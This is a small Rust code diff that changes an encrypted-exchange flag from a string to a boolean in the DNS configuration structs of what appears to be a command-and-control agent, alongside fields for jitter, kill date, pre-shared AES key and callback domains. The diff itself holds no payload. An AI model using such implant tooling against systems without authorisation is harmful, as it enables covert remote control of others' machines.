@@ -22,7 +22,7 @@ pub struct DnsInitialConfig {
     pub jitter: i32,
     pub killdate: String,
     #[serde(rename = "encrypted_exchange_check")]
-    pub encrypted_exchange_check: String,
+    pub encrypted_exchange_check: bool,
     #[serde(rename = "AESPSK")]
     pub aes_psk: String,
     #[serde(default)]
@@ -39,7 +39,7 @@ pub struct DnsProfile {
     interval: AtomicI32,
     jitter: AtomicI32,
     killdate: RwLock<NaiveDate>,
-    encrypted_exchange_check: RwLock<String>,
+    encrypted_exchange_check: RwLock<bool>,
     aes_key: RwLock<Option<Vec<u8>>>,
     uuid: RwLock<String>,
     domains: RwLock<Vec<String>>,
